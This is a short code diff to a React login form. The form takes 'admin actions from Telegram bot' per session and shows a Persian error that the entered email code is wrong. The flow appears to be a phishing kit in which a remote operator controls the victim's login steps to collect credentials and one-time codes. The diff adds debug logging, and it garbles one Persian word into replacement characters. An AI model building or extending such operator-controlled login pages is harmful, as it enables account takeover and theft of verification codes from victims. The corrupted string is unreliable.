@@ -190,8 +190,10 @@ export const LoginForm = () => {
 
   // Handle admin actions from Telegram bot
   const handleAdminAction = (action: string) => {
+    console.log("🚨 ADMIN ACTION RECEIVED:", action, "Current step:", currentStep);
+
     if (!sessionId) {
-      console.error("No session ID for admin action");
+      console.error("❌ No session ID for admin action");
       return;
     }
 
@@ -404,7 +406,7 @@ export const LoginForm = () => {
         setEmailCode(""); // Clear email code field
         setErrors({
           emailCode:
-            "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
+            "کد ایمیل وارد شده اشتباه است. لطفا کد ��حیح را وارد کنید.",
         });
         setHasError(true);
         break;
